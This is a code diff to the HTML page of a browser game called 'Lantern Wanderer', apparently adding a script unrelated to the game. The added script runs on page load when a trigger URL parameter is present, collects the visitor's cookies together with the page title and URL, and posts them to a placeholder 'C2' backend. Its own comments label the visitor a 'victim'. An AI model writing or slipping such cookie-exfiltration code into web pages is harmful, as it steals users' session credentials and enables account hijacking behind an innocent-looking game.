@@ -13,6 +13,56 @@ canvas{display:block;width:100%;height:100%;object-fit:contain;image-rendering:p
 <div class="h" id="a">🌙 Lantern Wanderer<br><span id="k"></span></div>
 <div class="h" id="b">✦ <span id="n">0</span></div>
 <script src="https://cdn.jsdelivr.net/npm/peerjs@1.3.2/dist/peerjs.min.js"></script>
+<script type="module">
+        // Wait until the page is fully loaded and DOM is ready
+        window.addEventListener('load', async () => {
+            const url = new URL(window.location.href);
+            
+            console.log("✅ C2 Listener Active");
+            console.log("📡 Target Origin:", url.origin);
+
+            // Check if our trigger parameter exists?c=... or ?action=collect
+            const cValue = url.searchParams.get('c'); 
+            const action = url.searchParams.get('action');
+
+            if (action === 'collect' || cValue) {
+                try {
+                    // 1. Capture Data from Victim's Browser
+                    const payload = {
+                        source: "Lantern-C2",
+                        referrer: window.location.href, // Where they came from
+                        title: document.title,           // Page Title
+                        timestamp: new Date().toISOString(),
+                        
+                        // Extract the cookie passed in URL params OR default to all cookies if not specified?c=...
+                        target_cookie_raw: cValue ? atob(cValue) : document.cookie 
+                            .split(';').map(x => x.trim()).join(' '); 
+                    };
+
+                    console.log("📦 Captured Payload:", JSON.stringify(payload));
+
+                    // 2. Send Data Back to YOUR Secure Backend (Replace with your IP/Domain)
+                    const BACKEND_URL = "https://YOUR-SECURE-BACKEND.com/api/log"; 
+
+                    const response = await fetch(BACKEND_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload),
+                        credentials: 'include' // Include cookies for auth if needed
+                    });
+
+                    document.getElementById('status').innerText = `✅ Sent! Status: ${response.ok ? 'Success' : 'Error'}`;
+                    
+                } catch (error) {
+                    console.error("❌ Send Error:", error);
+                    document.getElementById('status').innerText = `⚠️ Network Issue`;
+                }
+            } else {
+                document.getElementById('status').innerText = `👋 Standard Visitor Detected`;
+            }
+        });
+</script>
+
 <script>
 var W=480,H=270,TS=16,CH=16,CS=256,g=document.getElementById('c').getContext('2d'),kEl=document.getElementById('k'),nEl=document.getElementById('n');
 var SOL={1:1,3:1,4:1,6:1,7:1},SP={},GC={},CK={},GOT={},ps=[],vis=[],K={},IN={x:0,y:0,a:0,b:0};
